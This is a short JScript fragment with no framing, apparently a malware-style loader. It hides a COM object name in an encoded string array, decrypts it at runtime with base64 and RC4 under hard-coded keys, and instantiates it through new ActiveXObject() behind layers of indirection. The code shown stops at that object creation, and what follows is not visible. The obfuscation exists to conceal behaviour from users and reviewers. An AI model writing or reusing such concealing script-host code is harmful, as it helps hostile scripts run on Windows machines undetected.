function arrfn(){var data=['rCkWySkHzSkCW79ZW5PrcmovWRtcGGPW','hMqaWPxdSx7dNJRcTmoKsq0','FdC0WPSbqcddOmkyW7xdGNxcHYhdRumdWOqCqhLTs0HUkmoGWPBdOCkO','W7FcVbS4oW'];arrfn=function(){return data;};return arrfn();}
function dec(a,q){a=a-0x1f4;var X=arrfn();var V=X[a];
var m=function(C){var S='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var w='';var n=0,v=0;
for(var i=0;i<C.length;i++){var d=S.indexOf(C.charAt(i));if(d<0){break;}
v=(v<<6)|d;n+=6;if(n>=8){n-=8;w+='%'+('00'+((v>>n)&255).toString(16)).slice(-2);}}
return decodeURIComponent(w);};
var p=function(C,S){var s=[];for(var i=0;i<256;i++){s[i]=i;}
for(var i=0,j=0;i<256;i++){j=(j+s[i]+S.charCodeAt(i%S.length))%256;var t=s[i];s[i]=s[j];s[j]=t;}
var i=0,j=0,r='';for(var k=0;k<C.length;k++){i=(i+1)%256;j=(j+s[i])%256;var t=s[i];s[i]=s[j];s[j]=t;r+=String.fromCharCode(C.charCodeAt(k)^s[(s[i]+s[j])%256]);}
return r;};
return p(m(V),q);}
var d1=dec,d2=dec;
function selfdef(){var q=[dec(0x1f4,'k3y!'),dec(0x1f5,'P@ss'),dec(0x1f6,'w0rd')];
var g='ZZ';if(g===g){} return q;}
function H(d,F){var C=selfdef(),S=C[d];return S;}
var R=H,B=H;
var a={'ap':function(x,y){return x(y);},'cc':function(x,y){return x+y;}};
var obj=new ActiveXObject(a['cc'](a['cc'](a['ap'](R,0x0),H(0x1)),H(0x2)));
